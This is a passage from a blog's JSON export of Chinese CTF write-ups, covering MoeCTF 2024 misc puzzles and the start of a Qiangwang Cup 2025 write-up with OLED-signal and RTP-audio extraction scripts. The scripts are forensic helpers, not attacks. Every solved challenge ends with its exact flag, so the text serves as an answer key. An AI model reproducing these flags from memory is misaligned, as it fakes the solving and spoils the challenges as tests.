print(\u0026#34;[-] Unknow Key : %s\u0026#34; % (Bytes[0])) print(\u0026#34;[+] Found : %s\u0026#34; % (result)) # clean the temp data windows注释掉第二行，保留第二行;linux注释掉第二行，保留第一行 os.system(\u0026#34;rm ./%s\u0026#34; % (DataFileName)) os.remove(DataFileName) if __name__ == \u0026#34;__main__\u0026#34;: main() 即得flag：moectf{n1ha0w0y0udianl32451}\n捂住一只耳 音频中可以听到\u0026quot; moef 63 31 43 31 41 52 31 51 71 101\u0026quot;\n只观察数字最后一位可以发现都是123，按照题目info描述以及键盘考点相关搜索，可以发现键盘坐标图（也有被叫做键盘密码？）对应的是nevergetup，题目中描述按到了caps键，也就是大写键，即得flag：moectf{NEVERGETUP}\nthe_secret_of_snowball 压缩包解压之后得到jpg图片 1.jpg文件打不开，010打开发现文件头是 FFD6 , 修复文件头为 FFD8 2.修复好之后拿到前一部分flag 3.文件尾隐写信息，由等号、大写字母等判断base64，解密即得后一部分flag Find It 放到图片可以看到几个建筑物：雄峰集团 美居酒店等,又因为在西安市，直接地图搜索 不同的地图可能搜的不一样，可能会有2个雄峰，但再搜索美居酒店，两个在一起的就只有地图的①标，又因为美居酒店在雄峰集团的右后方 所以拍摄视角为： 直接在小区找幼儿园即可(读音问题也是非常抱歉，我是百度的读音，就直接上了orz)\nmoectf{ji_di_bao_you_er_yuan}\n我的图层在你之上 下载附件后直接扔到010中拖到最后可以发现一个链接\n打开链接发现是一个图片编辑器，将pdf扔进去发现自动分层了五份，也只有矢量pdf有这样的性质，这也是提示的原因（其实刚开始这个网站是没给的， 但这样的话有点恶心了（虽然感觉大家还是走偏了，orz\n其中path1，3，5都是在生成矢量pdf是产生的三个图层，而Bitmap的两个图层正是我们需要的，将图层提取出来后给两张图片做ADD位运算就能得到key （这里有一个问题就是出题人使用了弱密码，所以猜或者爆破也不失为一种好方法，orz\n揭开压缩包后得到caesar.txt为凯撒加密，解密后得到flag\nmoectf{d751894b-ee0a-47dd-85d4-e92d0443921f}\n时光穿梭机 1.确认王建墓 此题应该去逐字查看;\n认真审题首先想到《伦敦新闻画报》《the illustrated London News》，结合时间地点去查找 法一： https://www.britishnewspaperarchive.co.uk/search/results/1946-04-20/1946-04-20?FreeSearch=\u0026PhraseSearch=\u0026SomeSearch=\u0026AnySearch=\u0026NotSearch=\u0026SortOrder=2\u0026FrontPage=\u0026Region=\u0026County=london%2C+england\u0026Place=\u0026NewspaperTitle=illustrated%2Blondon%2Bnews\u0026PublicTag=\u0026IssueId=BL%2F0001578%2F19460420%2F\u0026ContentType= 就可以看到这个图： 主要是看到“wangchien”就够了，不需要去查看内容\n2.找公园对面的中医馆 由墓锁定 “ 成都永陵公园 ” ，街景地图找到对面医药馆的牌子，即得\nmoectf{han_fang_tang}\n解不完的压缩包 使用脚本循环解压999次\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import zipfile import os zip_file = \u0026#34;999.zip\u0026#34; dir = \u0026#34;./dir/\u0026#34; os.makedirs(dir, exist_ok=True) for i in range(999, 0, -1): current_zip = f\u0026#34;{i}.zip\u0026#34; zip_path = os.path.join(dir, zip_file) current_zip_path = os.path.join(dir, current_zip) with zipfile.ZipFile(zip_path, \u0026#39;r\u0026#39;) as zip_ref: zip_ref.extractall(dir) zip_file = current_zip print(\u0026#34;Successfully\u0026#34;) 解压成功后得到cccccccrc.zip,搜索crc等关键词可以了解一个叫crc碰撞的东西，并且此题正好符合解题要求，可以找crc碰撞脚本，笔者用的为zip-crack\n得到key: *m:#P7j0解压后得到flag moectf{af9c688e-e0b9-4900-879c-672b44c550ea}\nctfer2077② 注意到题目中的 法治富强自由富强和谐平等和谐平等法治法治和谐富强法治文明公正自由 为社会主义核心价值观编码 解码得到 p@55w0rd\n用vc挂在后 发现只有一个flag？.txt 此外毫无信息根据提示注意到此加密卷的文件系统为ntfs，检索相关的内容可以了解到ntfs隐藏数据流\n使用NtfsStreamsEditor可以导出小鹤.txt 检索了解到小鹤为一种双拼输入法，使用相关输入法可以得到 moectf{shuangpinshizheyangdazide}\nctfer2077③ 注意到给的是一个流量包，协议分级看到大部分数据都集中在http协议，筛选后看具体的内容发现是一个Post请求，上传了一个压缩包，提取进行下一步\n解压出来后有三个文件，将gif图分帧后可以发现key: C5EZFsC6\n还有一个mp3音频并且给了一个疑似密码的key可以联想到mp3stego decode后可以得到一串代码\n1 2 3 +++++ +++[- \u0026gt;++++ ++++\u0026lt; ]\u0026gt;+++ +++++ .\u0026lt;+++ +[-\u0026gt;- ---\u0026lt;] \u0026gt;---. \u0026lt;++++ +++[- \u0026gt;++++ +++\u0026lt;] \u0026gt;+.\u0026lt;+ ++++[ -\u0026gt;--- --\u0026lt;]\u0026gt; ----- -.\u0026lt;++ +[-\u0026gt;+ ++\u0026lt;]\u0026gt; +++++ +.\u0026lt;++ +[-\u0026gt;- --\u0026lt;]\u0026gt; -.\u0026lt;++ ++[-\u0026gt; ----\u0026lt; ]\u0026gt;--- -.\u0026lt;++ ++++[ -\u0026gt;+++ +++\u0026lt;] \u0026gt;++++ +.\u0026lt; 注意到mp3音频名称为brainfuck 检索后发现这是一种语言\n使用在线网站得到 key: H5gHWM9b 解压压缩包后得到3个txt文本，每个文本内都是01串 缩小后发现是有规律的 根据提示搜索可以了解这是福尔摩斯探案集中的跳舞的小人，找相关图片解码 （对照表为原书，除原书外的对照表貌似都有些问题，另外原书中的旗帜是分割作用，此处旗帜没任何用处，仅为标志）\n最终得到flag moectf{PEOPLE_DANCING_HAPPILY}\n小小套娃 这题套路题很简单\n1.idat隐写 使用pngcheck查看，发现IDAT块错误，推测是IDAT块隐写\n手动分离/binwalk提取/最后加的模块，发现是789C开头引入的，zlib解压，import hex\n得到一个png文件，二维码扫描得到，就是下一个压缩包的密码\n1 送你一个key！you\u0026#39;ve got the zipkey:874jfy37yf37y7 2.txt零宽隐写 记事本打开，复制内容，在下面网站打开 https://yuanfux.github.io/zero-width-web/\n得到被隐写的内容是： idon\u0026rsquo;tknowmaybeits:dhufhduh48589\n就是下一个压缩包的密码；\n3.佛与论禅 内容在以下网站解密 http://hi.pcmoe.net/buddha.html 即得flag： moectf{sfdh8334r784jfx_sdjjuhreubc}\n拼图糕手（revenge） 补齐二维码： 手动按照缺位，利用画图/在线网站/手机相册/balabala，都可以拼图 ImageMagic下的montage + gaps ，感兴趣可以自己搜索（选手IceKnife提供） 拼图扫描即得：\n1 2 balabalbalablbalblablbalabala//nihaopintugaoshou//encoded_flag{71517ysd%ryxsc!usv @ucy*wqosy*qxl\u0026amp;sxl*sbys^wb$syqwp$ysyw!qpw@hs} 看到了encoded_flag和encode.py\nencode.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 def self_encoding(input_text): code_setting_first=\u0026#34;doanythigfruebcjklmqpswvxz\u0026#34; code_setting_sec=\u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34; number_setting = \u0026#34;0123456789\u0026#34; encoded_text=\u0026#34; \u0026#34; for x in input_text: if x in code_setting_first: if ord(x) \u0026lt; 104 : num = ord(x) + 19 elif ord(x) \u0026gt; 115: num = ord(x) - 19 elif 104 \u0026lt;= ord(x) \u0026lt;= 115: num = 219 - ord(x) encoded_text += chr(num) + \u0026#34; \u0026#34; elif x in code_setting_sec: if 64 \u0026lt; ord(x) \u0026lt; 72: num = ord(x) + 7 elif 71 \u0026lt; ord(x) \u0026lt; 79: num = ord (x) - 7 elif 78 \u0026lt; ord(x) \u0026lt; 82: num = ord(x) + 9 elif 87 \u0026lt; ord(x) \u0026lt; 91: num = ord(x) - 9 elif 81 \u0026lt; ord(x) \u0026lt; 88: num = 168 - ord(x) encoded_text += chr(num) + \u0026#34; \u0026#34; elif x not in number_setting: encoded_text += x for i in range(len(input_text)): if input_text[i] in number_setting: if i != len(input_text) -1: x = int(input_text[i]) ^ int(input_text[i+1]) encoded_text += str(x) + \u0026#34; \u0026#34; elif i == len(input_text) - 1: encoded_text += input_text[-1] return encoded_text 先解决key，加密的key只含字母，所以只需要研究加密函数有关于字母的部分，写解密函数，把符号和不等号换一下得到的解密函数基本没有问题（我把加密函数里的\u0026gt;换成\u0026gt;=了，这样看上去方便一点）\ndecode.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 def decode(pwd): code_setting_first=\u0026#34;doanythigfruebcjklmqpswvxz\u0026#34; code_setting_sec=\u0026#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34; number_setting = \u0026#34;0123456789\u0026#34; decoded_text = \u0026#34; \u0026#34; for x in input_text: if x in code_setting_first: if 116 \u0026lt;= ord(x) \u0026lt;= 122: num = ord(x) - 19 elif 103 \u0026gt;= ord(x) \u0026gt;= 97: num = ord(x) + 19 elif 115 \u0026gt;= ord(x) \u0026gt;= 104: num = 219 - ord(x) decoded_text += chr(num) elif x in code_setting_sec: if 72 \u0026lt;= ord(x) \u0026lt;= 78: num = ord(x) - 7 elif 65 \u0026lt;= ord(x) \u0026lt;= 71: num = ord(x) + 7 elif 88 \u0026lt;= ord(x) \u0026lt;= 90: num = ord(x) - 9 elif 79 \u0026lt;= ord(x) \u0026lt;= 81: num = ord(x) + 9 elif 86 \u0026gt;= ord(x) \u0026gt;= 81:#此题确实在这里有些问题就是说,81对应了两个字符,诚恳道歉，但不影响flag输出 num = 168 - ord(x) decoded_text += chr(num) elif x not in number_setting: decoded_text += x for i in range(len(input_text)): if input_text[i] in number_setting: if i != len(input_text) - 1: x = int(input_text[i]) ^ int(input_text[i + 1]) decoded_text += str(x) + \u0026#34; \u0026#34; elif i == len(input_text) - 1: decoded_text += input_text[-1]#此题encoded_flag中71517回文可以直接用 得到 hs@dkj!dfhf$kdjfh$ud^hfuh*oeh\u0026amp;oej*fhljd*fvb@chb!vhefi%whf52367\nStrangeChacterHint 研究strangecharacterhint之后，可以得到StrangeCharacterStaywithNumberOnSomewhere,此题hint确实没有给全，所以最后补了个hint “strange character不能现身flag，对应的数字总是作为他的替身现身flag”，将其中的！@#%替换做数字 即得flag： moectf{hs2dkj1dfhf4kdjfh4ud6hfuh8oeh7oej8fhljd8fvb2chb1vhefi5whf52367}\n二进制漏洞审计 ","date":"2025-11-01T00:00:00Z","headings":[{"id":"安全杂项","level":2,"text":"安全杂项\n"},{"id":"二进制漏洞审计","level":2,"text":"二进制漏洞审计\n"},{"id":"杂项入门指北","level":3,"text":"杂项入门指北\n"},{"id":"signin","level":3,"text":"signin\n"},{"id":"罗小黑战记","level":3,"text":"罗小黑战记\n"},{"id":"ez_forensics","level":3,"text":"ez_Forensics\n"},{"id":"so-many-m","level":3,"text":"so many \u0026rsquo;m\u0026rsquo;\n"},{"id":"abnormal-lag","level":3,"text":"Abnormal lag\n"},{"id":"misc问卷调查","level":3,"text":"Misc问卷调查\n"},{"id":"ez_f5","level":3,"text":"ez_F5\n"},{"id":"the-upside-and-down","level":3,"text":"the upside and down\n"},{"id":"ctfer2077","level":3,"text":"ctfer2077①\n"},{"id":"ez_usbpcap","level":3,"text":"ez_usbpcap\n"},{"id":"捂住一只耳","level":3,"text":"捂住一只耳\n"},{"id":"the_secret_of_snowball","level":3,"text":"the_secret_of_snowball\n"},{"id":"find-it","level":3,"text":"Find It\n"},{"id":"我的图层在你之上","level":3,"text":"我的图层在你之上\n"},{"id":"时光穿梭机","level":3,"text":"时光穿梭机\n"},{"id":"解不完的压缩包","level":3,"text":"解不完的压缩包\n"},{"id":"ctfer2077-1","level":3,"text":"ctfer2077②\n"},{"id":"ctfer2077-2","level":3,"text":"ctfer2077③\n"},{"id":"小小套娃","level":3,"text":"小小套娃\n"},{"id":"拼图糕手revenge","level":3,"text":"拼图糕手（revenge）\n"},{"id":"strangechacterhint","level":3,"text":"StrangeChacterHint\n"}],"image":"https://expl0rer.top/p/moectf_2024/moectf2024_hu_5772e6da7eee7c44.webp","permalink":"https://expl0rer.top/p/moectf_2024/","title":"Moectf_2024"},{"content":"[TOC]\n2025年的强网杯结束了，这是我第一次参加这么重大的线上赛，还是比较紧张的，队里的师傅们都很强劲啊，一起通宵干crypto、misc、re、pwn、web！！\n前言 2025年的强网杯结束了，这是我第一次参加这么重大的线上赛，还是比较紧张的，我个人专PWN，但强网杯比较难啊，才出了1道PWN，还有一道是我的队友pwn-s.，队里的师傅们都很强劲啊，一起通宵干crypto、misc、re、pwn、web！！\n本以为能冲线下的，无奈实力不够，止步于全国116名，拿了793分（干掉14题，6题MISC、1题Reverse、2题PWN、4题Web、1题Crypto）。\n感谢哥布林首领、Crypto0、cx、LilRan、yearn、ZianTT、多多、清酒、秋雨样带飞！\n以下是我们小队的复现，欢迎交流！😄\n队伍名称：GoblinSEC\n队伍排名：116\nMISC 签到 解题思路 题目描述有flag\n1 2 cat flag flag{我已阅读参赛须知，并遵守比赛规则。} flag flag{我已阅读参赛须知，并遵守比赛规则。}\nPersonal Vault 解题思路 草拟马，010怎么非预期！！！🤬\n给了个DMP文件，我还以为取证呢。\n这道题用付费版lovelymem搜索flag也可以找到。\nflag flag{personal_vault_seems_a_little_volatile_innit}\n问卷调查 填问卷得flag咯，看到这里你直接跳吧。\nflag flag{我已知晓，并会认真撰写wp！}\nlegacyOLED 解题思路 sr 文件是 zip 文件（用010editor分析就可以看到，504B压缩包文件头标识），解压出来 metadata 看到 sigrok version=0.5.2，在 GitHub 以 oled sigrok 为关键词找到原题 CTFSG 2022\nhttps://github.com/bobby-tables2/CTF-Archive/blob/main/CTFSG%202022/SIGINT/Writeup/SIGINT.md\n在 sigrok 官网下载 PulseView，尝试使用 I²C 解码器，得到数据与以上原题很相似，基本可以确认是 SSD1306\n导出数据：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 Plain Text 2257254-2257254 I2C: Address/Data: Start 2257295-2257575 I2C: Address/Data: Address write: 3C 2257575-2257615 I2C: Address/Data: Write 2257615-2257655 I2C: Address/Data: ACK 2257670-2257990 I2C: Address/Data: Data write: 00 2257990-2258030 I2C: Address/Data: ACK 2258030-2258350 I2C: Address/Data: Data write: 20 2258350-2258390 I2C: Address/Data: ACK 2258390-2258710 I2C: Address/Data: Data write: 01 2258710-2258750 I2C: Address/Data: ACK 2258792-2258792 I2C: Address/Data: Stop 2258999-2258999 I2C: Address/Data: Start 2259039-2259319 I2C: Address/Data: Address write: 3C 2259319-2259359 I2C: Address/Data: Write 2259359-2259399 I2C: Address/Data: ACK 2259415-2259735 I2C: Address/Data: Data write: 00 2259735-2259775 I2C: Address/Data: ACK 2259775-2260095 I2C: Address/Data: Data write: 22 2260095-2260135 I2C: Address/Data: ACK 2260135-2260457 I2C: Address/Data: Data write: 03 2260456-2260497 I2C: Address/Data: ACK 2260496-2260816 I2C: Address/Data: Data write: 05 2260816-2260856 I2C: Address/Data: ACK 2260897-2260897 I2C: Address/Data: Stop 2261079-2261079 I2C: Address/Data: Start 2261119-2261399 I2C: Address/Data: Address write: 3C 2261399-2261439 I2C: Address/Data: Write 2261439-2261479 I2C: Address/Data: ACK 2261495-2261815 I2C: Address/Data: Data write: 00 2261815-2261855 I2C: Address/Data: ACK 2261855-2262175 I2C: Address/Data: Data write: 21 2262175-2262215 I2C: Address/Data: ACK 2262215-2262535 I2C: Address/Data: Data write: 22 2262535-2262575 I2C: Address/Data: ACK 2262575-2262895 I2C: Address/Data: Data write: 3B 2262895-2262935 I2C: Address/Data: ACK 2262977-2262977 I2C: Address/Data: Stop 2263226-2263226 I2C: Address/Data: Start 2263267-2263547 I2C: Address/Data: Address write: 3C 2263547-2263587 I2C: Address/Data: Write 2263587-2263627 I2C: Address/Data: ACK 2263665-2263985 I2C: Address/Data: Data write: 40 2263985-2264025 I2C: Address/Data: ACK 2264025-2264345 I2C: Address/Data: Data write: 00 2264345-2264385 I2C: Address/Data: ACK 2264385-2264705 I2C: Address/Data: Data write: 00 2264705-2264745 I2C: Address/Data: ACK 2264745-2265065 I2C: Address/Data: Data write: 00 2265065-2265105 I2C: Address/Data: ACK 2265105-2265425 I2C: Address/Data: Data write: 00 2265425-2265465 I2C: Address/Data: ACK 2265465-2265786 I2C: Address/Data: Data write: 00 2265786-2265826 I2C: Address/Data: ACK 2265826-2266146 I2C: Address/Data: Data write: 00 2266146-2266186 I2C: Address/Data: ACK 2266186-2266506 I2C: Address/Data: Data write: C0 2266506-2266546 I2C: Address/Data: ACK 2266546-2266866 I2C: Address/Data: Data write: 00 2266866-2266906 I2C: Address/Data: ACK 2266906-2267226 I2C: Address/Data: Data write: 00 2267226-2267266 I2C: Address/Data: ACK 2267266-2267586 I2C: Address/Data: Data write: E0 2267586-2267626 I2C: Address/Data: ACK 2267626-2267946 I2C: Address/Data: Data write: 01 2267946-2267986 I2C: Address/Data: ACK 2267986-2268306 I2C: Address/Data: Data write: 00 2268306-2268346 I2C: Address/Data: ACK 2268346-2268666 I2C: Address/Data: Data write: F8 2268666-2268706 I2C: Address/Data: ACK 2268706-2269026 I2C: Address/Data: Data write: 07 2269026-2269066 I2C: Address/Data: ACK 以下省略 不同的是，根据标准https://cdn-shop.adafruit.com/datasheets/SSD1306.pdf可知，本题既有横向绘图，又有纵向，写脚本提取数据并绘图。 SSD1306.pdf\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 with open(\u0026#39;export.txt\u0026#39;, \u0026#39;r\u0026#39;) as f: lines = f.read().splitlines() filtered_lines = [line for line in lines if \u0026#39;write: \u0026#39; in line] with open(\u0026#39;filtered.txt\u0026#39;, \u0026#39;w\u0026#39;) as f: for line in filtered_lines: f.write(line + \u0026#39;\\n\u0026#39;) groups = [] tmp = [] for line in filtered_lines: if line.endswith(\u0026#39;Address write: 3C\u0026#39;): if tmp: groups.append(tmp) tmp = [] else: tmp.append(int(line[-2:], 16)) if tmp: groups.append(tmp) print(groups) canvas = [[0] * 128 for _ in range(64)] horizontal = True page_start = 0 page_end = 7 page = 0 col_start = 0 col_end = 127 col = 0 for group in groups: match group: case [0x00, 0x20, 0x00]: horizontal = True case [0x00, 0x20, 0x01]: horizontal = False case [0x00, 0x21, col_l, col_h]: col_start = col_l col_end = col_h col = col_start case [0x00, 0x22, page_l, page_h]: page_start = page_l page_end = page_h page = page_start case [0x40, *data]: # col = col_start # page = page_start for byte in data: for bit in range(8): if page_start \u0026lt;= page \u0026lt;= page_end and col_start \u0026lt;= col \u0026lt;= col_end: canvas[page * 8 + bit][col] = (byte \u0026gt;\u0026gt; bit) \u0026amp; 1 if horizontal: col += 1 if col \u0026gt; col_end: col = col_start page += 1 if page \u0026gt; page_end: page = page_start else: page += 1 if page \u0026gt; page_end: page = page_start col += 1 if col \u0026gt; col_end: col = col_start for row in canvas: print(\u0026#39;\u0026#39;.join(\u0026#39;1\u0026#39; if pixel else \u0026#39;0\u0026#39; for pixel in row)) vscode打开看看：\n每 8 位的最高位是 0，猜测为 ASCII\n当然这个是赛博厨子，你用山羊puzzlesolver也行。\nflag qwb{Re41_Ma5te7-O5-S5Dl3o6_12C}\n谍影重重6.0 WMCTF2025 RTP流量\n上Python代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 #!/usr/bin/env python3 # -*- coding: utf-8 -*- \u0026#34;\u0026#34;\u0026#34; 超快速RTP流提取工具 直接处理原始字节，避免Scapy完整解析 \u0026#34;\u0026#34;\u0026#34; import os import struct import wave from concurrent.futures import ThreadPoolExecutor from collections import defaultdict import threading PCAP_FILE = \u0026#34;Data.pcap\u0026#34; OUTPUT_DIR = \u0026#34;rtp_audio\u0026#34; NUM_THREADS = 32 # 创建输出目录 os.makedirs(OUTPUT_DIR, exist_ok=True) # G.711 μ-law 解码表（预先构建） MULAW_TABLE = [] for i in range(256): mulaw = ~i \u0026amp; 0xFF sign = -1 if (mulaw \u0026amp; 0x80) else 1 exponent = (mulaw \u0026amp; 0x70) \u0026gt;\u0026gt; 4 mantissa = mulaw \u0026amp; 0x0F magnitude = ((mantissa \u0026lt;\u0026lt; 3) + 0x84) \u0026lt;\u0026lt; exponent magnitude = magnitude - 0x84 MULAW_TABLE.append(sign * magnitude) def decode_mulaw_fast(data): \u0026#34;\u0026#34;\u0026#34;快速解码 μ-law\u0026#34;\u0026#34;\u0026#34; result = bytearray(len(data) * 2) for i, byte in enumerate(data): pcm_value = MULAW_TABLE[byte] struct.pack_into(\u0026#39;\u0026lt;h\u0026#39;, result, i * 2, pcm_value) return bytes(result) def read_pcap_raw(filename): \u0026#34;\u0026#34;\u0026#34;快速读取pcap文件，只提取UDP包的原始数据\u0026#34;\u0026#34;\u0026#34; packets = [] with open(filename, \u0026#39;rb\u0026#39;) as f: # 读取全局头（24字节） global_header = f.read(24) if len(global_header) \u0026lt; 24: return packets magic = struct.unpack(\u0026#39;\u0026lt;I\u0026#39;, global_header[0:4])[0] if magic == 0xa1b2c3d4: endian = \u0026#39;\u0026lt;\u0026#39; elif magic == 0xd4c3b2a1: endian = \u0026#39;\u0026gt;\u0026#39; else: print(\u0026#34;不支持的pcap格式\u0026#34;) return packets count = 0 while True: # 读取包头（16字节） packet_header = f.read(16) if len(packet_header) \u0026lt; 16: break ts_sec, ts_usec, incl_len, orig_len = struct.unpack(f\u0026#39;{endian}IIII\u0026#39;, packet_header) # 读取包数据 packet_data = f.read(incl_len) if len(packet_data) \u0026lt; incl_len: break count += 1 if count % 100000 == 0: print(f\u0026#34;[*] 已读取 {count} 个包...\u0026#34;) packets.append(packet_data) return packets def parse_ethernet_ip_udp(raw_data): \u0026#34;\u0026#34;\u0026#34;快速解析以太网/IP/UDP包\u0026#34;\u0026#34;\u0026#34; try: # 以太网头（14字节） if len(raw_data) \u0026lt; 14: return None eth_type = struct.unpack(\u0026#39;!H\u0026#39;, raw_data[12:14])[0] # 检查是否是IP包（0x0800） if eth_type != 0x0800: return None # IP头（最小20字节） if len(raw_data) \u0026lt; 34: return None ip_start = 14 ip_header_len = (raw_data[ip_start] \u0026amp; 0x0F) * 4 ip_protocol = raw_data[ip_start + 9] # 检查是否是UDP（17） if ip_protocol != 17: return None src_ip = \u0026#39;.\u0026#39;.join(str(b) for b in raw_data[ip_start+12:ip_start+16]) dst_ip = \u0026#39;.\u0026#39;.join(str(b) for b in raw_data[ip_start+16:ip_start+20]) # UDP头（8字节） udp_start = ip_start + ip_header_len if len(raw_data) \u0026lt; udp_start + 8: return None src_port = struct.unpack(\u0026#39;!H\u0026#39;, raw_data[udp_start:udp_start+2])[0] dst_port = struct.unpack(\u0026#39;!H\u0026#39;, raw_data[udp_start+2:udp_start+4])[0] udp_len = struct.unpack(\u0026#39;!H\u0026#39;, raw_data[udp_start+4:udp_start+6])[0] # UDP payload payload_start = udp_start + 8 udp_payload = raw_data[payload_start:payload_start + udp_len - 8] return { \u0026#39;src_ip\u0026#39;: src_ip, \u0026#39;dst_ip\u0026#39;: dst_ip, \u0026#39;src_port\u0026#39;: src_port, \u0026#39;dst_port\u0026#39;: dst_port, \u0026#39;payload\u0026#39;: udp_payload } except: return None def parse_rtp(udp_payload): \u0026#34;\u0026#34;\u0026#34;快速解析RTP包\u0026#34;\u0026#34;\u0026#34; try: if len(udp_payload) \u0026lt; 12: return None # 检查版本号 version = (udp_payload[0] \u0026gt;\u0026gt; 6) \u0026amp; 0x03 if version != 2: return None padding = (udp_payload[0] \u0026gt;\u0026gt; 5) \u0026amp; 0x01 csrc_count = udp_payload[0] \u0026amp; 0x0F payload_type = udp_payload[1] \u0026amp; 0x7F sequence = struct.unpack(\u0026#39;!H\u0026#39;, udp_payload[2:4])[0] timestamp = struct.unpack(\u0026#39;!I\u0026#39;, udp_payload[4:8])[0] ssrc = struct.unpack(\u0026#39;!I\u0026#39;, udp_payload[8:12])[0] # 提取payload header_len = 12 + (4 * csrc_count) if len(udp_payload) \u0026lt; header_len: return None payload = udp_payload[header_len:] # 移除padding if padding and len(payload) \u0026gt; 0: padding_len = payload[-1] if padding_len \u0026lt;= len(payload): payload = payload[:-padding_len] return { \u0026#39;ssrc\u0026#39;: ssrc, \u0026#39;sequence\u0026#39;: sequence, \u0026#39;timestamp\u0026#39;: timestamp, \u0026#39;payload_type\u0026#39;: payload_type, \u0026#39;payload\u0026#39;: payload } except: return None # 全局计数器 processed_counter = 0 rtp_counter = 0 counter_lock = threading.Lock() def process_packet_batch(args): \u0026#34;\u0026#34;\u0026#34;处理一批数据包\u0026#34;\u0026#34;\u0026#34; batch_id, packets_batch = args global processed_counter, rtp_counter local_streams = defaultdict(lambda: { \u0026#39;packets\u0026#39;: [], \u0026#39;payload_type\u0026#39;: None, \u0026#39;src_ip\u0026#39;: None, \u0026#39;dst_ip\u0026#39;: None, \u0026#39;src_port\u0026#39;: None, \u0026#39;dst_port\u0026#39;: None }) local_rtp_count = 0 for raw_packet in packets_batch: # 解析UDP包 udp_info = parse_ethernet_ip_udp(raw_packet) if not udp_info: continue # 解析RTP rtp_info = parse_rtp(udp_info[\u0026#39;payload\u0026#39;]) if not rtp_info: continue local_rtp_count += 1 ssrc = rtp_info[\u0026#39;ssrc\u0026#39;] # 记录流信息 if local_streams[ssrc][\u0026#39;payload_type\u0026#39;] is None: local_streams[ssrc][\u0026#39;payload_type\u0026#39;] = rtp_info[\u0026#39;payload_type\u0026#39;] local_streams[ssrc][\u0026#39;src_ip\u0026#39;] = udp_info[\u0026#39;src_ip\u0026#39;] local_streams[ssrc][\u0026#39;dst_ip\u0026#39;] = udp_info[\u0026#39;dst_ip\u0026#39;] local_streams[ssrc][\u0026#39;src_port\u0026#39;] = udp_info[\u0026#39;src_port\u0026#39;] local_streams[ssrc][\u0026#39;dst_port\u0026#39;] = udp_info[\u0026#39;dst_port\u0026#39;] local_streams[ssrc][\u0026#39;packets\u0026#39;].append({ \u0026#39;sequence\u0026#39;: rtp_info[\u0026#39;sequence\u0026#39;], \u0026#39;timestamp\u0026#39;: rtp_info[\u0026#39;timestamp\u0026#39;], \u0026#39;payload\u0026#39;: rtp_info[\u0026#39;payload\u0026#39;] }) # 更新全局计数器 with counter_lock: processed_counter += len(packets_batch) rtp_counter += local_rtp_count if processed_counter % 100000 \u0026lt; len(packets_batch): print(f\u0026#34;[*] 已处理 {processed_counter} 个包, 找到 {rtp_counter} 个RTP包...\u0026#34;) return dict(local_streams) def merge_streams(all_results): \u0026#34;\u0026#34;\u0026#34;合并所有线程的结果\u0026#34;\u0026#34;\u0026#34; merged = defaultdict(lambda: { \u0026#39;packets\u0026#39;: [], \u0026#39;payload_type\u0026#39;: None, \u0026#39;src_ip\u0026#39;: None, \u0026#39;dst_ip\u0026#39;: None, \u0026#39;src_port\u0026#39;: None, \u0026#39;dst_port\u0026#39;: None }) for result in all_results: for ssrc, stream_data in result.items(): if merged[ssrc][\u0026#39;payload_type\u0026#39;] is None: merged[ssrc][\u0026#39;payload_type\u0026#39;] = stream_data[\u0026#39;payload_type\u0026#39;] merged[ssrc][\u0026#39;src_ip\u0026#39;] = stream_data[\u0026#39;src_ip\u0026#39;] merged[ssrc][\u0026#39;dst_ip\u0026#39;] = stream_data[\u0026#39;dst_ip\u0026#39;] merged[ssrc][\u0026#39;src_port\u0026#39;] = stream_data[\u0026#39;src_port\u0026#39;] merged[ssrc][\u0026#39;dst_port\u0026#39;] = stream_data[\u0026#39;dst_port\u0026#39;] merged[ssrc][\u0026#39;packets\u0026#39;].extend(stream_data[\u0026#39;packets\u0026#39;]) return dict(merged) def main(): global processed_counter, rtp_counter print(f\u0026#34;[+] 正在快速读取 {PCAP_FILE}...\u0026#34;) packets = read_pcap_raw(PCAP_FILE) total_packets = len(packets) print(f\u0026#34;[+] 已读取 {total_packets} 个数据包到内存\u0026#34;) print(f\u0026#34;[+] 使用 {NUM_THREADS} 个线程并行处理\u0026#34;) # 将数据包分批 batch_size = (total_packets + NUM_THREADS - 1) // NUM_THREADS batches = [(i, packets[i:i + batch_size]) for i in range(0, total_packets, 